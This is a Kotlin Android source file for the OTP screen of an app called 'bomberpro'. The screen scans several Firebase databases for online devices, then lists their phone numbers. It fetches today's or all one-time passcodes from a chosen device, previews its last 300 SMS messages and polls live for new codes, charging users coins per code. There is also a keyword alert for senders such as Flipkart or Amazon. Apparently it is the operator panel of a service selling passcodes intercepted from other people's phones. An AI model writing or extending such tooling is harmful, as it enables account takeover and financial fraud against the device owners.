package com.sanji.bomberpro.ui.otp

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.ChevronRight
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Star
import androidx.compose.material.icons.filled.StarBorder
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.OtpMessage
import com.sanji.bomberpro.services.Device
import com.sanji.bomberpro.services.OtpFavorite
import com.sanji.bomberpro.services.OtpFavoritesService
import com.sanji.bomberpro.services.OtpService
import com.sanji.bomberpro.services.RealtimeDbService
import com.sanji.bomberpro.services.UserDataService
import com.sanji.bomberpro.theme.LocalSanjiColors
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

private enum class OtpView { LIST, DETAIL, RESULT, LIVE, FAVS, KEYWORD }

private val IST_FMT_SHORT = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault())
private val IST_FMT_FULL = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())

private fun formatIstShort(ts: Long): String =
    try { IST_FMT_SHORT.format(Date(ts * 1000L)) } catch (_: Exception) { "—" }

private fun formatIstFull(ts: Long): String =
    try { IST_FMT_FULL.format(Date(ts * 1000L)) } catch (_: Exception) { "—" }

@Composable
fun OtpScreen(
    uid: String,
    userName: String,
    userEmail: String,
    isAdmin: Boolean,
    onBack: () -> Unit,
) {
    val colors = LocalSanjiColors.current
    val scope = rememberCoroutineScope()
    val context = LocalContext.current

    val userData = remember { UserDataService() }
    val otpService = remember { OtpService() }
    val rtdb = remember { RealtimeDbService() }
    val favSvc = remember { OtpFavoritesService() }

    var view by remember { mutableStateOf(OtpView.LIST) }
    var devices by remember { mutableStateOf<List<Device>>(emptyList()) }
    var selected by remember { mutableStateOf<Device?>(null) }
    var scanning by remember { mutableStateOf(false) }
    var error by remember { mutableStateOf<String?>(null) }
    var coins by remember { mutableStateOf(0) }
    var otpCost by remember { mutableStateOf(FirebaseConfig.DEFAULT_OTP_COST) }
    var searchQuery by remember { mutableStateOf("") }
    var resultList by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
    var resultAllMsgs by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
    var lastMode by remember { mutableStateOf("") }
    var liveRunning by remember { mutableStateOf(false) }
    var liveOtps by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
    var liveJob by remember { mutableStateOf<Job?>(null) }
    var liveCoinsSpent by remember { mutableStateOf(0) }
    var livePauseReason by remember { mutableStateOf<String?>(null) }
    var favorites by remember { mutableStateOf<List<OtpFavorite>>(emptyList()) }
    var keyword by remember { mutableStateOf("") }
    var keywordInput by remember { mutableStateOf("") }
    var loadingAction by remember { mutableStateOf(false) }

    suspend fun refreshCoins() {
        coins = userData.getCoins(uid)
    }

    suspend fun scanDevices() {
        scanning = true
        error = null
        try {
            val fbs = rtdb.loadFirebases()
            devices = rtdb.scanAll(fbs)
            if (devices.isEmpty()) error = "No devices online"
        } catch (e: Exception) {
            error = "Scan failed: ${e.message}"
        } finally {
            scanning = false
        }
    }

    fun copyToClipboard(label: String, value: String) {
        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.setPrimaryClip(ClipData.newPlainText(label, value))
    }

    LaunchedEffect(Unit) {
        refreshCoins()
        val settings = userData.getGlobalSettings()
        otpCost = settings.otpCost
        keyword = favSvc.getWatchKeyword(uid)
        keywordInput = keyword
        favorites = favSvc.listFavorites(uid)
        scanDevices()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(colors.background)
            .padding(16.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            IconButton(onClick = {
                if (view == OtpView.LIST) onBack()
                else if (view == OtpView.LIVE) {
                    // stopping live when navigating back
                    liveRunning = false
                    liveJob?.cancel()
                    liveJob = null
                    view = OtpView.DETAIL
                } else view = OtpView.LIST
            }) {
                Icon(Icons.Default.ArrowBack, "Back", tint = colors.onBackground)
            }
            Spacer(Modifier.weight(1f))
            when (view) {
                OtpView.LIST -> {
                    IconButton(onClick = { view = OtpView.KEYWORD }) {
                        Icon(Icons.Default.Notifications, "Keyword", tint = colors.primary)
                    }
                    IconButton(onClick = { view = OtpView.FAVS }) {
                        Icon(Icons.Default.Star, "Favorites", tint = colors.primary)
                    }
                    IconButton(onClick = { scope.launch { scanDevices() } }) {
                        Icon(Icons.Default.Refresh, "Refresh", tint = colors.primary)
                    }
                }
                else -> Unit
            }
        }

        Spacer(Modifier.height(8.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Text(
                text = when (view) {
                    OtpView.LIST -> "Get OTP"
                    OtpView.DETAIL -> "Device"
                    OtpView.RESULT -> if (lastMode == "new") "NEW OTPs" else if (lastMode == "old") "OLD OTPs" else "Messages"
                    OtpView.LIVE -> "Live Mode"
                    OtpView.FAVS -> "Favorites"
                    OtpView.KEYWORD -> "Keyword Watch"
                },
                fontSize = 18.sp,
                fontWeight = FontWeight.Bold,
                color = colors.onBackground,
            )
            Surface(
                shape = RoundedCornerShape(20.dp),
                color = colors.primary.copy(alpha = 0.15f),
            ) {
                Row(
                    modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                    verticalAlignment = Alignment.CenterVertically,
                ) {
                    Text(
                        text = "🪙 $coins",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = colors.primary,
                    )
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        when (view) {
            OtpView.LIST -> DeviceListSection(
                devices = devices,
                scanning = scanning,
                searchQuery = searchQuery,
                onSearchChange = { searchQuery = it },
                error = error,
                onRefresh = { scope.launch { scanDevices() } },
                onSelect = { dv ->
                    selected = dv
                    view = OtpView.DETAIL
                },
            )

            OtpView.DETAIL -> {
                val dv = selected
                if (dv == null) {
                    view = OtpView.LIST
                } else {
                    DeviceDetailSection(
                        device = dv,
                        otpCost = otpCost,
                        coins = coins,
                        loading = loadingAction,
                        onFetchNew = {
                            scope.launch {
                                loadingAction = true
                                error = null
                                try {
                                    val found = otpService.collectToday(dv)
                                    val all = otpService.collectAll(dv)

                                    if (found.isNotEmpty()) {
                                        // success — deduct coins if not admin
                                        if (!isAdmin) {
                                            if (coins < otpCost) {
                                                error = "Need $otpCost coins (have $coins)"
                                                resultList = emptyList()
                                                resultAllMsgs = all
                                                lastMode = "new"
                                                view = OtpView.RESULT
                                                return@launch
                                            }
                                            if (!userData.deductCoins(uid, otpCost, "otp-fetch-new")) {
                                                error = "Deduct failed"
                                                resultList = emptyList()
                                                resultAllMsgs = all
                                                lastMode = "new"
                                                view = OtpView.RESULT
                                                return@launch
                                            }
                                            refreshCoins()
                                        }
                                        val first = found.first()
                                        userData.saveOtpHistory(
                                            uid = uid,
                                            otp = first.otps.firstOrNull() ?: "?",
                                            sender = first.sender,
                                            deviceName = dv.deviceName,
                                            deviceShort = dv.shortId,
                                            devicePhone = dv.phone ?: "",
                                            firebaseLabel = dv.firebaseLabel,
                                            mode = "new",
                                            cost = if (isAdmin) 0 else otpCost,
                                        )
                                    } else {
                                        // no OTP — no deduction, no refund needed
                                        error = null
                                    }

                                    resultList = found
                                    resultAllMsgs = all
                                    lastMode = "new"
                                    view = OtpView.RESULT
                                } catch (e: Exception) {
                                    error = "Fetch failed: ${e.message}"
                                } finally {
                                    loadingAction = false
                                }
                            }
                        },
                        onFetchOld = {
                            scope.launch {
                                loadingAction = true
                                error = null
                                try {
                                    val found = otpService.collectAllOtp(dv)
                                    val all = otpService.collectAll(dv)

                                    if (found.isNotEmpty()) {
                                        if (!isAdmin) {
                                            if (coins < otpCost) {
                                                error = "Need $otpCost coins (have $coins)"
                                                resultList = emptyList()
                                                resultAllMsgs = all
                                                lastMode = "old"
                                                view = OtpView.RESULT
                                                return@launch
                                            }
                                            if (!userData.deductCoins(uid, otpCost, "otp-fetch-old")) {
                                                error = "Deduct failed"
                                                resultList = emptyList()
                                                resultAllMsgs = all
                                                lastMode = "old"
                                                view = OtpView.RESULT
                                                return@launch
                                            }
                                            refreshCoins()
                                        }
                                        val first = found.first()
                                        userData.saveOtpHistory(
                                            uid = uid,
                                            otp = first.otps.firstOrNull() ?: "?",
                                            sender = first.sender,
                                            deviceName = dv.deviceName,
                                            deviceShort = dv.shortId,
                                            devicePhone = dv.phone ?: "",
                                            firebaseLabel = dv.firebaseLabel,
                                            mode = "old",
                                            cost = if (isAdmin) 0 else otpCost,
                                        )
                                    } else {
                                        error = null
                                    }

                                    resultList = found
                                    resultAllMsgs = all
                                    lastMode = "old"
                                    view = OtpView.RESULT
                                } catch (e: Exception) {
                                    error = "Fetch failed: ${e.message}"
                                } finally {
                                    loadingAction = false
                                }
                            }
                        },
                        onMessages = {
                            scope.launch {
                                loadingAction = true
                                error = null
                                try {
                                    val all = otpService.collectAll(dv)
                                    resultList = all
                                    resultAllMsgs = all
                                    lastMode = "msgs"
                                    view = OtpView.RESULT
                                } finally {
                                    loadingAction = false
                                }
                            }
                        },
                        onLive = {
                            if (!isAdmin && coins < otpCost) {
                                error = "Need $otpCost coins to start live mode"
                                return@DeviceDetailSection
                            }
                            liveOtps = emptyList()
                            liveCoinsSpent = 0
                            livePauseReason = null
                            liveRunning = true
                            view = OtpView.LIVE
                            val startedTs = System.currentTimeMillis() / 1000L
                            val maxLimit = FirebaseConfig.DEFAULT_LIVE_OTP_LIMIT
                            val timeoutEnd = System.currentTimeMillis() + (FirebaseConfig.DEFAULT_LIVE_TIMEOUT_SEC * 1000L)
                            liveJob = scope.launch {
                                try {
                                    while (liveRunning && System.currentTimeMillis() < timeoutEnd) {
                                        if (liveOtps.size >= maxLimit) {
                                            livePauseReason = "Reached $maxLimit OTPs limit"
                                            break
                                        }

                                        val newFound = otpService.collectSince(dv, startedTs)
                                        val toAdd = newFound.filter { o ->
                                            !liveOtps.any { existing -> existing.hash == o.hash }
                                        }

                                        if (toAdd.isNotEmpty()) {
                                            for (o in toAdd) {
                                                if (isAdmin) {
                                                    userData.saveOtpHistory(
                                                        uid = uid,
                                                        otp = o.otps.firstOrNull() ?: "?",
                                                        sender = o.sender,
                                                        deviceName = dv.deviceName,
                                                        deviceShort = dv.shortId,
                                                        devicePhone = dv.phone ?: "",
                                                        firebaseLabel = dv.firebaseLabel,
                                                        mode = "live",
                                                        cost = 0,
                                                    )
                                                    continue
                                                }
                                                if (coins < otpCost) {
                                                    livePauseReason = "Out of coins"
                                                    break
                                                }
                                                if (userData.deductCoins(uid, otpCost, "otp-live")) {
                                                    refreshCoins()
                                                    liveCoinsSpent += otpCost
                                                    userData.saveOtpHistory(
                                                        uid = uid,
                                                        otp = o.otps.firstOrNull() ?: "?",
                                                        sender = o.sender,
                                                        deviceName = dv.deviceName,
                                                        deviceShort = dv.shortId,
                                                        devicePhone = dv.phone ?: "",
                                                        firebaseLabel = dv.firebaseLabel,
                                                        mode = "live",
                                                        cost = otpCost,
                                                    )
                                                } else {
                                                    livePauseReason = "Deduct failed"
                                                    break
                                                }
                                            }
                                            liveOtps = liveOtps + toAdd
                                        }

                                        if (livePauseReason != null) break
                                        delay(4000)
                                    }
                                    if (livePauseReason == null && System.currentTimeMillis() >= timeoutEnd) {
                                        livePauseReason = "Time limit reached"
                                    }
                                } catch (_: Exception) {}
                            }
                        },
                    )
                }
            }

            OtpView.RESULT -> FetchResultSection(
                mode = lastMode,
                messages = if (lastMode == "msgs") resultAllMsgs else resultList,
                onCopy = { code -> copyToClipboard("OTP", code) },
                onFavorite = { m ->
                    scope.launch {
                        val otpCode = m.otps.firstOrNull() ?: return@launch
                        favSvc.addFavorite(uid, otpCode, m.sender, selected?.deviceName ?: "")
                        favorites = favSvc.listFavorites(uid)
                    }
                },
                onBack = { view = OtpView.DETAIL },
            )

            OtpView.LIVE -> LiveSection(
                otps = liveOtps,
                coinsSpent = liveCoinsSpent,
                coinsLeft = coins,
                running = liveRunning,
                pauseReason = livePauseReason,
                onCopy = { code -> copyToClipboard("OTP", code) },
                onStop = {
                    liveRunning = false
                    liveJob?.cancel()
                    liveJob = null
                },
                onBack = {
                    liveRunning = false
                    liveJob?.cancel()
                    liveJob = null
                    view = OtpView.DETAIL
                },
            )

            OtpView.FAVS -> FavoritesSection(
                favorites = favorites,
                onCopy = { otp -> copyToClipboard("OTP", otp) },
                onRemove = { favId ->
                    scope.launch {
                        favSvc.removeFavorite(uid, favId)
                        favorites = favSvc.listFavorites(uid)
                    }
                },
            )

            OtpView.KEYWORD -> KeywordSection(
                keywordInput = keywordInput,
                onChange = { keywordInput = it },
                currentKeyword = keyword,
                onSave = {
                    scope.launch {
                        val ok = favSvc.setWatchKeyword(uid, keywordInput)
                        if (ok) {
                            keyword = keywordInput.trim().lowercase()
                            view = OtpView.LIST
                        }
                    }
                },
                onClear = {
                    scope.launch {
                        favSvc.setWatchKeyword(uid, "")
                        keyword = ""
                        keywordInput = ""
                    }
                },
            )
        }

        if (error != null) {
            Spacer(Modifier.height(8.dp))
            Text(error!!, color = colors.error, fontSize = 12.sp)
        }
    }
}

@Composable
private fun DeviceListSection(
    devices: List<Device>,
    scanning: Boolean,
    searchQuery: String,
    onSearchChange: (String) -> Unit,
    error: String?,
    onRefresh: () -> Unit,
    onSelect: (Device) -> Unit,
) {
    val colors = LocalSanjiColors.current
    val filtered = if (searchQuery.isBlank()) devices else devices.filter {
        it.deviceName.contains(searchQuery, ignoreCase = true) ||
                (it.phone?.contains(searchQuery, ignoreCase = true) == true) ||
                it.shortId.contains(searchQuery, ignoreCase = true)
    }

    OutlinedTextField(
        value = searchQuery,
        onValueChange = onSearchChange,
        leadingIcon = { Icon(Icons.Default.Search, null, tint = colors.onSurfaceVariant) },
        placeholder = { Text("Search device / phone / code") },
        singleLine = true,
        modifier = Modifier.fillMaxWidth(),
        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text),
    )

    Spacer(Modifier.height(12.dp))

    if (scanning) {
        Box(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.Center,
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                CircularProgressIndicator(color = colors.primary)
                Spacer(Modifier.height(12.dp))
                Text("Scanning devices…", color = colors.onSurfaceVariant, fontSize = 12.sp)
            }
        }
        return
    }

    if (filtered.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text(
                    text = if (devices.isEmpty()) "No devices online" else "No matches",
                    fontSize = 14.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = colors.onBackground,
                )
                Spacer(Modifier.height(8.dp))
                TextButton(onClick = onRefresh) {
                    Text("Refresh", color = colors.primary)
                }
            }
        }
        return
    }

    LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        items(filtered) { dv ->
            DeviceCard(device = dv, onClick = { onSelect(dv) })
        }
    }
}

@Composable
private fun DeviceCard(device: Device, onClick: () -> Unit) {
    val colors = LocalSanjiColors.current
    Surface(
        onClick = onClick,
        shape = RoundedCornerShape(14.dp),
        color = colors.surface,
        modifier = Modifier.fillMaxWidth(),
    ) {
        Row(
            modifier = Modifier.padding(14.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = device.deviceName.ifBlank { "Unknown device" },
                    fontSize = 14.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = colors.onBackground,
                )
                Spacer(Modifier.height(2.dp))
                Text(
                    text = device.phone ?: "no number",
                    fontSize = 11.sp,
                    color = colors.onSurfaceVariant,
                    fontFamily = FontFamily.Monospace,
                )
                Spacer(Modifier.height(2.dp))
                Row {
                    Text(
                        text = "🔑 ${device.shortId}",
                        fontSize = 10.sp,
                        color = colors.primary,
                        fontFamily = FontFamily.Monospace,
                    )
                    if (device.battery != null) {
                        Spacer(Modifier.width(8.dp))
                        Text(
                            text = "🔋${device.battery}%",
                            fontSize = 10.sp,
                            color = colors.onSurfaceVariant,
                        )
                    }
                }
            }
            Icon(Icons.Default.ChevronRight, null, tint = colors.onSurfaceVariant)
        }
    }
}

@Composable
private fun DeviceDetailSection(
    device: Device,
    otpCost: Int,
    coins: Int,
    loading: Boolean,
    onFetchNew: () -> Unit,
    onFetchOld: () -> Unit,
    onMessages: () -> Unit,
    onLive: () -> Unit,
) {
    val colors = LocalSanjiColors.current
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        Surface(shape = RoundedCornerShape(14.dp), color = colors.surface) {
            Column(Modifier.padding(14.dp)) {
                DetailRow("Name", device.deviceName)
                DetailRow("Phone", device.phone ?: "—")
                DetailRow("Code", device.shortId)
                DetailRow("Firebase", device.firebaseLabel)
                DetailRow("Battery", device.battery?.let { "$it%" } ?: "—")
                DetailRow("Cost / fetch", "$otpCost coins")
                DetailRow("Your coins", "$coins")
            }
        }

        ActionRow(
            label = "🆕 NEW — today's OTPs",
            detail = "Fresh from midnight IST · costs $otpCost coins on success",
            enabled = !loading,
            onClick = onFetchNew,
        )
        ActionRow(
            label = "📜 OLD — all OTPs",
            detail = "Every OTP available · costs $otpCost coins on success",
            enabled = !loading,
            onClick = onFetchOld,
        )
        ActionRow(
            label = "⏱ LIVE — watch for new",
            detail = "Polls every 4s · costs $otpCost coins per new OTP",
            enabled = !loading,
            onClick = onLive,
        )
        ActionRow(
            label = "📬 Last messages",
            detail = "Free · preview last 300 messages",
            enabled = !loading,
            onClick = onMessages,
        )

        if (loading) {
            Box(Modifier.fillMaxWidth().padding(20.dp), contentAlignment = Alignment.Center) {
                CircularProgressIndicator(color = colors.primary)
            }
        }
    }
}

@Composable
private fun DetailRow(label: String, value: String) {
    val colors = LocalSanjiColors.current
    Row(
        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween,
    ) {
        Text(label, fontSize = 12.sp, color = colors.onSurfaceVariant)
        Text(value, fontSize = 12.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground)
    }
}

@Composable
private fun ActionRow(
    label: String,
    detail: String,
    enabled: Boolean,
    onClick: () -> Unit,
) {
    val colors = LocalSanjiColors.current
    Surface(
        onClick = { if (enabled) onClick() },
        shape = RoundedCornerShape(14.dp),
        color = colors.surface,
        enabled = enabled,
        modifier = Modifier.fillMaxWidth(),
    ) {
        Column(Modifier.padding(14.dp)) {
            Text(label, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground)
            Spacer(Modifier.height(2.dp))
            Text(detail, fontSize = 11.sp, color = colors.onSurfaceVariant)
        }
    }
}

@Composable
private fun FetchResultSection(
    mode: String,
    messages: List<OtpMessage>,
    onCopy: (String) -> Unit,
    onFavorite: (OtpMessage) -> Unit,
    onBack: () -> Unit,
) {
    val colors = LocalSanjiColors.current

    if (messages.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text(
                    text = if (mode == "msgs") "No messages" else "No OTPs found",
                    fontSize = 14.sp,
                    color = colors.onBackground,
                )
                Spacer(Modifier.height(8.dp))
                Text(
                    text = if (mode == "new") "Try OLD or LIVE mode" else "Try LIVE mode",
                    fontSize = 11.sp,
                    color = colors.onSurfaceVariant,
                )
                if (mode != "msgs") {
                    Spacer(Modifier.height(4.dp))
                    Text(
                        text = "No coins charged for empty results.",
                        fontSize = 11.sp,
                        color = colors.success,
                    )
                }
                Spacer(Modifier.height(12.dp))
                TextButton(onClick = onBack) { Text("Back", color = colors.primary) }
            }
        }
        return
    }

    LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        items(messages) { m ->
            Surface(shape = RoundedCornerShape(14.dp), color = colors.surface) {
                Column(Modifier.padding(12.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Column(modifier = Modifier.weight(1f)) {
                            if (m.otps.isNotEmpty()) {
                                Text(
                                    text = m.otps.joinToString(", "),
                                    fontSize = 18.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = colors.primary,
                                    fontFamily = FontFamily.Monospace,
                                )
                            } else {
                                Text("no OTP", fontSize = 12.sp, color = colors.onSurfaceVariant)
                            }
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = "📤 ${m.sender}",
                                fontSize = 12.sp,
                                color = colors.onBackground,
                            )
                            Text(
                                text = "🕐 ${formatIstShort(m.ts)}",
                                fontSize = 11.sp,
                                color = colors.onSurfaceVariant,
                            )
                        }
                        if (m.otps.isNotEmpty()) {
                            IconButton(onClick = { onCopy(m.otps.first()) }) {
                                Icon(Icons.Default.ContentCopy, "Copy", tint = colors.primary)
                            }
                            IconButton(onClick = { onFavorite(m) }) {
                                Icon(Icons.Default.StarBorder, "Fav", tint = colors.primary)
                            }
                        }
                    }
                    Spacer(Modifier.height(6.dp))
                    Text(m.body, fontSize = 11.sp, color = colors.onSurfaceVariant)
                }
            }
        }
    }
}

@Composable
private fun LiveSection(
    otps: List<OtpMessage>,
    coinsSpent: Int,
    coinsLeft: Int,
    running: Boolean,
    pauseReason: String?,
    onCopy: (String) -> Unit,
    onStop: () -> Unit,
    onBack: () -> Unit,
) {
    val colors = LocalSanjiColors.current
    Column(modifier = Modifier.fillMaxSize()) {
        Surface(shape = RoundedCornerShape(14.dp), color = colors.surface) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = if (running) "🟢 Watching…" else "⏹ Stopped",
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold,
                        color = colors.primary,
                    )
                    Text(
                        "Poll every 4s · coins spent: $coinsSpent · left: $coinsLeft",
                        fontSize = 11.sp,
                        color = colors.onSurfaceVariant,
                    )
                    if (pauseReason != null) {
                        Text(
                            "⏸ $pauseReason",
                            fontSize = 11.sp,
                            color = colors.warning,
                        )
                    }
                }
                if (running) {
                    Button(
                        onClick = onStop,
                        colors = ButtonDefaults.buttonColors(
                            containerColor = colors.error,
                            contentColor = Color.White,
                        ),
                    ) { Text("STOP") }
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        if (otps.isEmpty()) {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Text("Waiting for new OTPs…", color = colors.onSurfaceVariant, fontSize = 12.sp)
                    if (pauseReason != null) {
                        Spacer(Modifier.height(6.dp))
                        Text(pauseReason, color = colors.warning, fontSize = 11.sp)
                    }
                }
            }
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(otps.reversed()) { m ->
                    Surface(shape = RoundedCornerShape(14.dp), color = colors.surface) {
                        Column(Modifier.padding(12.dp)) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Column(Modifier.weight(1f)) {
                                    Text(
                                        text = m.otps.joinToString(", "),
                                        fontSize = 18.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = colors.primary,
                                        fontFamily = FontFamily.Monospace,
                                    )
                                    Text("📤 ${m.sender}", fontSize = 12.sp, color = colors.onBackground)
                                    Text("🕐 ${formatIstFull(m.ts)}", fontSize = 11.sp, color = colors.onSurfaceVariant)
                                }
                                if (m.otps.isNotEmpty()) {
                                    IconButton(onClick = { onCopy(m.otps.first()) }) {
                                        Icon(Icons.Default.ContentCopy, "Copy", tint = colors.primary)
                                    }
                                }
                            }
                            Spacer(Modifier.height(4.dp))
                            Text(m.body, fontSize = 11.sp, color = colors.onSurfaceVariant)
                        }
                    }
                }
            }
        }

        Spacer(Modifier.height(8.dp))
        TextButton(onClick = onBack, modifier = Modifier.fillMaxWidth()) {
            Text("← Back", color = colors.onSurfaceVariant)
        }
    }
}

@Composable
private fun FavoritesSection(
    favorites: List<OtpFavorite>,
    onCopy: (String) -> Unit,
    onRemove: (String) -> Unit,
) {
    val colors = LocalSanjiColors.current
    if (favorites.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No favorites yet", color = colors.onSurfaceVariant, fontSize = 13.sp)
        }
        return
    }
    LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        items(favorites) { f ->
            Surface(shape = RoundedCornerShape(14.dp), color = colors.surface) {
                Row(
                    modifier = Modifier.padding(12.dp),
                    verticalAlignment = Alignment.CenterVertically,
                ) {
                    Column(Modifier.weight(1f)) {
                        Text(
                            text = f.otp,
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold,
                            color = colors.primary,
                            fontFamily = FontFamily.Monospace,
                        )
                        Text("📤 ${f.sender}", fontSize = 11.sp, color = colors.onBackground)
                        Text("🕐 ${formatIstShort(f.savedAt)}", fontSize = 10.sp, color = colors.onSurfaceVariant)
                    }
                    IconButton(onClick = { onCopy(f.otp) }) {
                        Icon(Icons.Default.ContentCopy, "Copy", tint = colors.primary)
                    }
                    IconButton(onClick = { onRemove(f.id) }) {
                        Icon(Icons.Default.Delete, "Delete", tint = colors.error)
                    }
                }
            }
        }
    }
}

@Composable
private fun KeywordSection(
    keywordInput: String,
    onChange: (String) -> Unit,
    currentKeyword: String,
    onSave: () -> Unit,
    onClear: () -> Unit,
) {
    val colors = LocalSanjiColors.current
    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        Text(
            "When any device message contains this keyword, you get alerted on next OTP fetch.",
            fontSize = 12.sp,
            color = colors.onSurfaceVariant,
        )
        OutlinedTextField(
            value = keywordInput,
            onValueChange = onChange,
            label = { Text("Keyword (e.g. flipkart, amazon)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Button(
            onClick = onSave,
            modifier = Modifier.fillMaxWidth().height(50.dp),
            colors = ButtonDefaults.buttonColors(containerColor = colors.primary, contentColor = Color.Black),
        ) { Text("Save Keyword") }
        if (currentKeyword.isNotBlank()) {
            TextButton(onClick = onClear, modifier = Modifier.fillMaxWidth()) {
                Text("Clear keyword", color = colors.error)
            }
        }
    }
}